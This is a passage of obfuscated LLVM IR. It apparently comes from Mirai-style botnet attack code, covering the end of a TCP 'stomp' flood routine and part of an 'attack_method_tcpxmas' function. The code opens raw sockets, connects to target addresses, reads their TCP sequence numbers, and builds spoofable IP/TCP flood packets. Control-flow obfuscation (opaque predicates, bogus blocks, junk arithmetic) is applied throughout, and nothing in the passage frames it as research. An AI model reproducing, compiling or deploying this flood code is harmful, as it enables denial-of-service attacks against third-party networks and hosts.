  %785 = load i32, i32* @y.30
  %786 = sub i32 %784, 1
  %787 = mul i32 %784, %786
  %788 = urem i32 %787, 2
  %789 = icmp eq i32 %788, 0
  %790 = icmp slt i32 %785, 10
  %791 = or i1 %789, %790
  br i1 %791, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %783
  %792 = load i32, i32* @x.29
  %793 = load i32, i32* @y.30
  %794 = sub i32 %792, 1
  %795 = mul i32 %792, %794
  %796 = urem i32 %795, 2
  %797 = icmp eq i32 %796, 0
  %798 = icmp slt i32 %793, 10
  %799 = or i1 %797, %798
  br i1 %799, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %105
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %122
  store i32 1, i32* %9, align 4
  %800 = load i32, i32* %10, align 4
  %801 = bitcast i32* %9 to i8*
  %802 = call i32 @setsockopt(i32 %800, i32 0, i32 3, i8* %801, i32 4) #6
  %803 = icmp eq i32 %802, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %147
  %804 = load i32, i32* %9, align 4
  %805 = load i8, i8* %5, align 1
  %806 = zext i8 %805 to i32
  %807 = icmp slt i32 %804, %806
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %172
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %238
  %808 = call i32 @rand_next()
  %_ = shl i32 %808, 65535
  %_15 = sub i32 %808, 65535
  %gen = mul i32 %_15, 65535
  %_16 = sub i32 %808, 65535
  %gen17 = mul i32 %_16, 65535
  %_18 = shl i32 %808, 65535
  %_19 = sub i32 0, %808
  %gen20 = add i32 %_19, 65535
  %809 = and i32 %808, 65535
  %810 = trunc i32 %809 to i16
  %811 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %810, i16* %811, align 2
  br label %originalBB14

originalBB24alteredBB:                            ; preds = %originalBB24, %283
  %812 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %813 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %812, i32 0, i32 0
  %814 = load i32, i32* %813, align 4
  %815 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %816 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %815, i32 0, i32 0
  %817 = load i32, i32* %816, align 4
  %818 = icmp eq i32 %814, %817
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %331
  %819 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %820 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %819, i32 0, i32 4
  %821 = load i16, i16* %820, align 4
  %_30 = sub i16 0, %821
  %gen31 = add i16 %_30, 12
  %_32 = shl i16 %821, 12
  %_33 = shl i16 %821, 12
  %_34 = sub i16 %821, 12
  %gen35 = mul i16 %_34, 12
  %_36 = sub i16 %821, 12
  %gen37 = mul i16 %_36, 12
  %_38 = sub i16 %821, 12
  %gen39 = mul i16 %_38, 12
  %822 = lshr i16 %821, 12
  %_40 = sub i16 0, %822
  %gen41 = add i16 %_40, 1
  %_42 = shl i16 %822, 1
  %_43 = sub i16 0, %822
  %gen44 = add i16 %_43, 1
  %_45 = sub i16 0, %822
  %gen46 = add i16 %_45, 1
  %_47 = sub i16 %822, 1
  %gen48 = mul i16 %_47, 1
  %_49 = shl i16 %822, 1
  %823 = and i16 %822, 1
  %824 = zext i16 %823 to i32
  %825 = icmp ne i32 %824, 0
  br label %originalBB29

originalBB53alteredBB:                            ; preds = %originalBB53, %355
  %826 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %827 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %826, i32 0, i32 0
  %828 = load i32, i32* %827, align 4
  %829 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %830 = load i32, i32* %9, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %829, i64 %831
  %833 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %832, i32 0, i32 0
  store i32 %828, i32* %833, align 4
  %834 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %835 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %834, i32 0, i32 2
  %836 = load i32, i32* %835, align 4
  %837 = call i32 @ntohl(i32 %836) #7
  %838 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %839 = load i32, i32* %9, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %838, i64 %840
  %842 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %841, i32 0, i32 1
  store i32 %837, i32* %842, align 4
  %843 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %844 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %843, i32 0, i32 3
  %845 = load i32, i32* %844, align 4
  %846 = call i32 @ntohl(i32 %845) #7
  %847 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %848 = load i32, i32* %9, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %847, i64 %849
  %851 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %850, i32 0, i32 2
  store i32 %846, i32* %851, align 4
  %852 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %853 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %852, i32 0, i32 1
  %854 = load i16, i16* %853, align 2
  %855 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %856 = load i32, i32* %9, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %855, i64 %857
  %859 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %858, i32 0, i32 3
  store i16 %854, i16* %859, align 4
  %860 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %861 = load i16, i16* %860, align 2
  %862 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %863 = load i32, i32* %9, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %862, i64 %864
  %866 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %865, i32 0, i32 4
  store i16 %861, i16* %866, align 2
  %867 = load i32, i32* %24, align 4
  %868 = sext i32 %867 to i64
  %_54 = sub i64 40, %868
  %gen55 = mul i64 %_54, %868
  %_56 = sub i64 40, %868
  %gen57 = mul i64 %_56, %868
  %_58 = sub i64 0, 40
  %gen59 = add i64 %_58, %868
  %_60 = shl i64 40, %868
  %_61 = sub i64 0, 40
  %gen62 = add i64 %_61, %868
  %_63 = sub i64 0, 40
  %gen64 = add i64 %_63, %868
  %869 = add i64 40, %868
  %870 = call noalias i8* @malloc(i64 %869) #6
  %871 = load i8**, i8*** %12, align 8
  %872 = load i32, i32* %9, align 4
  %873 = sext i32 %872 to i64
  %874 = getelementptr inbounds i8*, i8** %871, i64 %873
  store i8* %870, i8** %874, align 8
  %875 = load i8**, i8*** %12, align 8
  %876 = load i32, i32* %9, align 4
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds i8*, i8** %875, i64 %877
  %879 = load i8*, i8** %878, align 8
  %880 = bitcast i8* %879 to %struct.iphdr*
  store %struct.iphdr* %880, %struct.iphdr** %36, align 8
  %881 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %882 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %881, i64 1
  %883 = bitcast %struct.iphdr* %882 to %struct.tcphdr*
  store %struct.tcphdr* %883, %struct.tcphdr** %37, align 8
  %884 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %885 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %884, i64 1
  %886 = bitcast %struct.tcphdr* %885 to i8*
  store i8* %886, i8** %38, align 8
  %887 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %888 = bitcast %struct.iphdr* %887 to i8*
  %889 = load i8, i8* %888, align 4
  %_65 = sub i8 0, %889
  %gen66 = add i8 %_65, 15
  %_67 = shl i8 %889, 15
  %_68 = sub i8 0, %889
  %gen69 = add i8 %_68, 15
  %_70 = sub i8 %889, 15
  %gen71 = mul i8 %_70, 15
  %890 = and i8 %889, 15
  %_72 = sub i8 %890, 64
  %gen73 = mul i8 %_72, 64
  %_74 = sub i8 0, %890
  %gen75 = add i8 %_74, 64
  %891 = or i8 %890, 64
  store i8 %891, i8* %888, align 4
  %892 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %893 = bitcast %struct.iphdr* %892 to i8*
  %894 = load i8, i8* %893, align 4
  %_76 = sub i8 0, %894
  %gen77 = add i8 %_76, -16
  %895 = and i8 %894, -16
  %_78 = shl i8 %895, 5
  %_79 = sub i8 %895, 5
  %gen80 = mul i8 %_79, 5
  %_81 = shl i8 %895, 5
  %_82 = shl i8 %895, 5
  %896 = or i8 %895, 5
  store i8 %896, i8* %893, align 4
  %897 = load i8, i8* %13, align 1
  %898 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %899 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %898, i32 0, i32 1
  store i8 %897, i8* %899, align 1
  %900 = load i32, i32* %24, align 4
  %901 = sext i32 %900 to i64
  %_83 = shl i64 40, %901
  %_84 = sub i64 40, %901
  %gen85 = mul i64 %_84, %901
  %_86 = sub i64 0, 40
  %gen87 = add i64 %_86, %901
  %_88 = sub i64 0, 40
  %gen89 = add i64 %_88, %901
  %_90 = sub i64 0, 40
  %gen91 = add i64 %_90, %901
  %_92 = sub i64 0, 40
  %gen93 = add i64 %_92, %901
  %_94 = sub i64 0, 40
  %gen95 = add i64 %_94, %901
  %902 = add i64 40, %901
  %903 = trunc i64 %902 to i16
  %904 = call zeroext i16 @htons(i16 zeroext %903) #7
  %905 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %906 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %905, i32 0, i32 2
  store i16 %904, i16* %906, align 2
  %907 = load i16, i16* %14, align 2
  %908 = call zeroext i16 @htons(i16 zeroext %907) #7
  %909 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %910 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %909, i32 0, i32 3
  store i16 %908, i16* %910, align 4
  %911 = load i8, i8* %15, align 1
  %912 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %913 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %912, i32 0, i32 5
  store i8 %911, i8* %913, align 4
  %914 = load i8, i8* %16, align 1
  %915 = icmp ne i8 %914, 0
  br label %originalBB53

originalBB99alteredBB:                            ; preds = %originalBB99, %604
  %916 = load i32, i32* %26, align 4
  %917 = call i32 @close(i32 %916)
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %641
  %918 = load i32, i32* %9, align 4
  %919 = load i8, i8* %5, align 1
  %920 = zext i8 %919 to i32
  %921 = icmp slt i32 %918, %920
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %688
  %922 = load i8*, i8** %42, align 8
  %923 = load i32, i32* %24, align 4
  call void @rand_str(i8* %922, i32 %923)
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %783
  br label %originalBB111
}

declare i32 @fcntl(i32, i32, ...) #4

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.31
  %6 = load i32, i32* @y.32
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %struct.attack_stomp_data*, align 8
  %20 = alloca i8**, align 8
  %21 = alloca i8, align 1
  %22 = alloca i16, align 2
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i16, align 2
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i32, align 4
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca %struct.sockaddr_in, align 4
  %36 = alloca %struct.sockaddr_in, align 4
  %37 = alloca i32, align 4
  %38 = alloca [256 x i8], align 16
  %39 = alloca i64, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %41 = alloca i32, align 4
  %42 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %43 = alloca %struct.tcphdr*, align 8
  %44 = alloca %struct.iphdr*, align 8
  %45 = alloca %struct.tcphdr*, align 8
  %46 = alloca i8*, align 8
  %47 = alloca i8*, align 8
  %48 = alloca %struct.iphdr*, align 8
  %49 = alloca %struct.tcphdr*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %52 = load i8, i8* %13, align 1
  %53 = zext i8 %52 to i64
  %54 = call noalias i8* @calloc(i64 %53, i64 16) #6
  %55 = bitcast i8* %54 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %55, %struct.attack_stomp_data** %19, align 8
  %56 = load i8, i8* %13, align 1
  %57 = zext i8 %56 to i64
  %58 = call noalias i8* @calloc(i64 %57, i64 8) #6
  %59 = bitcast i8* %58 to i8**
  store i8** %59, i8*** %20, align 8
  %60 = load i8, i8* %15, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 2, i32 0)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %21, align 1
  %64 = load i8, i8* %15, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 3, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %22, align 2
  %68 = load i8, i8* %15, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 4, i32 64)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %23, align 1
  %72 = load i8, i8* %15, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 5, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %24, align 1
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 7, i32 65535)
  %79 = trunc i32 %78 to i16
  store i16 %79, i16* %25, align 2
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 11, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %26, align 1
  %84 = load i8, i8* %15, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 12, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %27, align 1
  %88 = load i8, i8* %15, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 13, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %28, align 1
  %92 = load i8, i8* %15, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 14, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %29, align 1
  %96 = load i8, i8* %15, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 15, i32 1)
  %99 = trunc i32 %98 to i8
  store i8 %99, i8* %30, align 1
  %100 = load i8, i8* %15, align 1
  %101 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %102 = call i32 @attack_get_opt_int(i8 zeroext %100, %struct.attack_option* %101, i8 zeroext 16, i32 1)
  %103 = trunc i32 %102 to i8
  store i8 %103, i8* %31, align 1
  %104 = load i8, i8* %15, align 1
  %105 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %106 = call i32 @attack_get_opt_int(i8 zeroext %104, %struct.attack_option* %105, i8 zeroext 0, i32 768)
  store i32 %106, i32* %32, align 4
  %107 = load i8, i8* %15, align 1
  %108 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %109 = call i32 @attack_get_opt_int(i8 zeroext %107, %struct.attack_option* %108, i8 zeroext 1, i32 1)
  %110 = trunc i32 %109 to i8
  store i8 %110, i8* %33, align 1
  %111 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %111, i32* %18, align 4
  %112 = icmp eq i32 %111, -1
  %113 = load i32, i32* @x.31
  %114 = load i32, i32* @y.32
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %112, label %121, label %122

; <label>:121:                                    ; preds = %originalBBpart2
  br label %847

; <label>:122:                                    ; preds = %originalBBpart2
  %123 = load i32, i32* @x.31
  %124 = load i32, i32* @y.32
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %122
  store i32 1, i32* %17, align 4
  %131 = load i32, i32* %18, align 4
  %132 = bitcast i32* %17 to i8*
  %133 = call i32 @setsockopt(i32 %131, i32 0, i32 3, i8* %132, i32 4) #6
  %134 = icmp eq i32 %133, -1
  %135 = load i32, i32* @x.31
  %136 = load i32, i32* @y.32
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %134, label %143, label %146

; <label>:143:                                    ; preds = %originalBBpart24
  %144 = load i32, i32* %18, align 4
  %145 = call i32 @close(i32 %144)
  br label %847

; <label>:146:                                    ; preds = %originalBBpart24
  store i32 0, i32* %17, align 4
  br label %147

; <label>:147:                                    ; preds = %668, %146
  %148 = load i32, i32* %17, align 4
  %149 = load i8, i8* %13, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp slt i32 %148, %150
  br i1 %151, label %152, label %671

; <label>:152:                                    ; preds = %147
  %153 = load i32, i32* @x.31
  %154 = load i32, i32* @y.32
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %152
  %161 = load i32, i32* @x.31
  %162 = load i32, i32* @y.32
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %169

; <label>:169:                                    ; preds = %631, %originalBBpart224, %originalBBpart28
  %170 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %170, i32* %34, align 4
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %173

; <label>:172:                                    ; preds = %169
  br label %668

; <label>:173:                                    ; preds = %169
  %174 = load i32, i32* %34, align 4
  %175 = load i32, i32* %34, align 4
  %176 = call i32 (i32, i32, ...) @fcntl(i32 %175, i32 3, i32 0)
  %177 = or i32 %176, 2048
  %178 = call i32 (i32, i32, ...) @fcntl(i32 %174, i32 4, i32 %177)
  %179 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 0
  store i16 2, i16* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %181 = load i32, i32* %17, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 2
  %185 = load i8, i8* %184, align 4
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %186, 32
  br i1 %187, label %188, label %209

; <label>:188:                                    ; preds = %173
  %189 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %190 = load i32, i32* %17, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 1
  %194 = load i32, i32* %193, align 4
  %195 = call i32 @ntohl(i32 %194) #7
  %196 = call i32 @rand_next()
  %197 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %198 = load i32, i32* %17, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i8, i8* %201, align 4
  %203 = zext i8 %202 to i32
  %204 = lshr i32 %196, %203
  %205 = add i32 %195, %204
  %206 = call i32 @htonl(i32 %205) #7
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %207, i32 0, i32 0
  store i32 %206, i32* %208, align 4
  br label %218

; <label>:209:                                    ; preds = %173
  %210 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %211 = load i32, i32* %17, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i64 %212
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i32 0, i32 1
  %215 = load i32, i32* %214, align 4
  %216 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %217 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %216, i32 0, i32 0
  store i32 %215, i32* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %209, %188
  %219 = load i16, i16* %25, align 2
  %220 = zext i16 %219 to i32
  %221 = icmp eq i32 %220, 65535
  br i1 %221, label %222, label %243

; <label>:222:                                    ; preds = %218
  %223 = load i32, i32* @x.31
  %224 = load i32, i32* @y.32
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %222
  %231 = call i32 @rand_next()
  %232 = and i32 %231, 65535
  %233 = trunc i32 %232 to i16
  %234 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  store i16 %233, i16* %234, align 2
  %235 = load i32, i32* @x.31
  %236 = load i32, i32* @y.32
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %247

; <label>:243:                                    ; preds = %218
  %244 = load i16, i16* %25, align 2
  %245 = call zeroext i16 @htons(i16 zeroext %244) #7
  %246 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  store i16 %245, i16* %246, align 2
  br label %247

; <label>:247:                                    ; preds = %243, %originalBBpart212
  %248 = load i32, i32* @x.31
  %249 = load i32, i32* @y.32
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %247
  %256 = load i32, i32* %34, align 4
  %257 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %258 = bitcast %struct.sockaddr_in* %35 to %struct.sockaddr*
  store %struct.sockaddr* %258, %struct.sockaddr** %257, align 8
  %259 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %260 = load %struct.sockaddr*, %struct.sockaddr** %259, align 8
  %261 = call i32 @connect(i32 %256, %struct.sockaddr* %260, i32 16)
  %262 = call i64 @time(i64* null) #6
  store i64 %262, i64* %39, align 8
  %263 = load i32, i32* @x.31
  %264 = load i32, i32* @y.32
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %271

; <label>:271:                                    ; preds = %originalBBpart236, %originalBBpart216
  store i32 16, i32* %37, align 4
  %272 = load i32, i32* %18, align 4
  %273 = getelementptr inbounds [256 x i8], [256 x i8]* %38, i32 0, i32 0
  %274 = bitcast %union.__CONST_SOCKADDR_ARG* %42 to %struct.sockaddr**
  %275 = bitcast %struct.sockaddr_in* %36 to %struct.sockaddr*
  store %struct.sockaddr* %275, %struct.sockaddr** %274, align 8
  %276 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %42, i32 0, i32 0
  %277 = load %struct.sockaddr*, %struct.sockaddr** %276, align 8
  %278 = call i64 @recvfrom(i32 %272, i8* %273, i64 256, i32 16384, %struct.sockaddr* %277, i32* %37)
  %279 = trunc i64 %278 to i32
  store i32 %279, i32* %41, align 4
  %280 = load i32, i32* %41, align 4
  %281 = icmp eq i32 %280, -1
  br i1 %281, label %282, label %283

; <label>:282:                                    ; preds = %271
  br label %847

; <label>:283:                                    ; preds = %271
  %284 = load i32, i32* @x.31
  %285 = load i32, i32* @y.32
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %283
  %292 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %36, i32 0, i32 2
  %293 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 4
  %295 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %296 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %295, i32 0, i32 0
  %297 = load i32, i32* %296, align 4
  %298 = icmp eq i32 %294, %297
  %299 = load i32, i32* @x.31
  %300 = load i32, i32* @y.32
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %298, label %307, label %626

; <label>:307:                                    ; preds = %originalBBpart220
  %308 = load i32, i32* %41, align 4
  %309 = sext i32 %308 to i64
  %310 = icmp ugt i64 %309, 40
  br i1 %310, label %311, label %626

; <label>:311:                                    ; preds = %307
